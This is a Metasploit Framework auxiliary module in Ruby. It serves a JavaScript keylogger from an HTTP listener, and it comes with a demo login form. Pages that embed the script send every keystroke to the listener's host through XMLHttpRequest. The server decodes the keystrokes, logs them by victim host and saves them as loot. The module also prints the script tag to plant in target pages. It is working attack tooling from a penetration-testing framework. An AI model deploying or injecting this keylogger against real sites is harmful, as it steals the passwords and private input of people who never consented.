##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'HTTP JavaScript Keylogger',
			'Description'	=> %q{
					This modules runs a HTTP Server to serve as a remote keylog listener
					to capture web page keystrokes.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['Marcus J. Carey <mjc[at]threatagent.com>'],
	))

	register_options(
		[
			OptBool.new('DEMO', [true, "Creates HTML for demo purposes",false]),
		], self.class)
	end

def demo
	# This is the Demo Form Page <HTML>
		html = <<EOS
<html>
<head>
<title>Demo Form</title>
<script type="text/javascript" src="#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}.js"></script>
</head>
<body bgcolor="white">
<br><br>
<div align="center"> 
<h1>Keylogger Demo Form</h1>
<form method=\"POST\" name=\"logonf\" action=\"#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}/demo\">
<p><font color="red"><i>This form submits data to the Metasploit listener <br>at #{datastore['SRVHOST']}:#{datastore['SRVPORT']} for demonstration purposes.</i></font>
<br><br>
<table border="0" cellspacing="0" cellpadding="0"> 
<tr><td>Username:</td> <td><input name="username" size="20"></td> </tr>
<tr><td>Password:</td> <td><input type="password" name="password" size="20"></td> </tr>
</table>
<p align="center"><input type="submit" value="Submit"></p></form>
</div>
</body>
</html>
EOS
		return html
	end

	# This is the JavaScript Key Logger Code
	def keylogger
		code = <<EOS
window.onload = function load#{@random_text}(){
	l#{@random_text} = ",";
	document.onkeypress = p#{@random_text};
	document.onkeydown = d#{@random_text};
}
function p#{@random_text}(e){
	k#{@random_text} = window.event.keyCode;
	k#{@random_text} = k#{@random_text}.toString(16);
	if (k#{@random_text} != "d"){
		#{@random_text}(k#{@random_text});
	}
}
function d#{@random_text}(e){
	k#{@random_text} = window.event.keyCode;
	if (k#{@random_text} == 9 || k#{@random_text} == 8 || k#{@random_text} == 13){
		#{@random_text}(k#{@random_text});
	}
}
function #{@random_text}(k#{@random_text}){
	l#{@random_text} = l#{@random_text} + k#{@random_text} + ",";
	if (window.XMLHttpRequest){
		xmlhttp=new XMLHttpRequest();
	}
	else{
		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp=new XMLHttpRequest();
	xmlhttp.open("GET","#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}&[" + l#{@random_text} + "]",true);
	xmlhttp.send();
}
EOS
		return code
	end

	def log_parser(log)
		@raw_log = ""
		log.split(",").each do |char|
			case char.to_i
			# Do Backspace
			when 8
				if @raw_log.present?
					if @raw_log[@raw_log.length - 4,@raw_log.length] == "<CR>"
						@raw_log = @raw_log[0, @raw_log.length - 4]
					elsif @raw_log[@raw_log.length - 5,@raw_log.length] == "<TAB>"
						@raw_log = @raw_log[0, @raw_log.length - 5]
					else
						@raw_log = @raw_log[0, @raw_log.length - 1]
					end
				end

			when 9  then @raw_log += "<TAB>"
			when 13 then @raw_log += "<CR>"

			else
				@raw_log += char.to_s.hex.chr
			end
		end
	end

	def collect_keystrokes(host,keylog)
		if @keystrokes_log[host].nil?
			@keystrokes_log[host] = "=================================================================\n"
			@keystrokes_log[host] << "  HTTP Javascript Keylogger Activity - Source #{host}\n"
			@keystrokes_log[host] << "=================================================================\n"
			@keystrokes_log[host] << host + " - " + keylog 
		else
			@keystrokes_log[host] << host + " - " + keylog 
		end
	end

	def cleanup 
		super
		unless @cleanup_has_run # This prevents cleanup running multiple times per host.
			@keystrokes_log.keys.each do |host|
				path = store_loot("js.keylogger", "text/plain", host, @keystrokes_log[host])
				print_status("Stored loot at #{path}")
			end
		end
		@cleanup_has_run = true
	end

	def current_time
		return Time.new.utc.strftime("[%d/%b/%Y:%H:%M:%S %Z]")
	end

	# Creates and prints timestamp
	def request_timestamp(cli,request)
		print_status("#{cli.peerhost} - #{current_time} - [HTTP GET] - #{request.uri}")
	end

	# This handles the HTTP responses for the Web server
	def on_request_uri(cli, request)
		#@host = cli.peerhost
		case request.uri
			# Reply with JavaScript Source if *.js is requested
			when /\.js/
				content_type = "text/plain"
				content = keylogger
				send_response(cli, content, {'Content-Type'=> content_type})
				request_timestamp(cli,request)
			when /demo/
				if datastore['DEMO']
					content = demo
					content_type = "text/html"
					send_response(cli, content, {'Content-Type'=> content_type})
					request_timestamp(cli,request)
				end
			# JavaScript XML HTTP GET Request is used for sending the keystrokes over network.
			when /#{datastore['URIPATH']}&/
				content_type = "text/plain"
				send_response(cli, @random_text, {'Content-Type'=> content_type})
				log = request.uri.split("&")[1]
				log_parser(log)
				collect_keystrokes(cli.peerhost,current_time + " - " + @raw_log + "\r\n")
				if log.length > 1 
					print_good("#{cli.peerhost} - #{current_time} - [KEYLOG] - #{@raw_log}")
				end
			# Reply with Demo Page
			else
				# Reply with 404 - Content Not Found
				content = "Error 404 (Not Found)!"
				send_response(cli, "<html><title>#{content}</title><h1>#{content}</h1></html>", {'Content-Type' => 'text/html'})
		end
	end

	def detect_http_mode 
		if datastore['SSL']
			@http_mode = "https://"
		else
			@http_mode = "http://"
		end
	end

	# This is the module's main runtime method
	def run
		datastore['URIPATH'] = Rex::Text.rand_text_alpha(12)
		@random_text = Rex::Text.rand_text_alpha(12)
		@cleanup_has_run = false
		@keystrokes_log = {} 
		detect_http_mode
		script_source = "#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}.js"

		# Prints Demo Page
		if datastore['DEMO']
			print_status("Demonstration Form URL => %grn#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}/demo%clr")
		end

		# Prints HTML Embed Code
		print_status(" Keylogger <HTML> Code => %blu<script type=\"text/javascript\" src=\"#{script_source}\"></script>%clr")

		# Starts Web Server
		exploit
	end
end

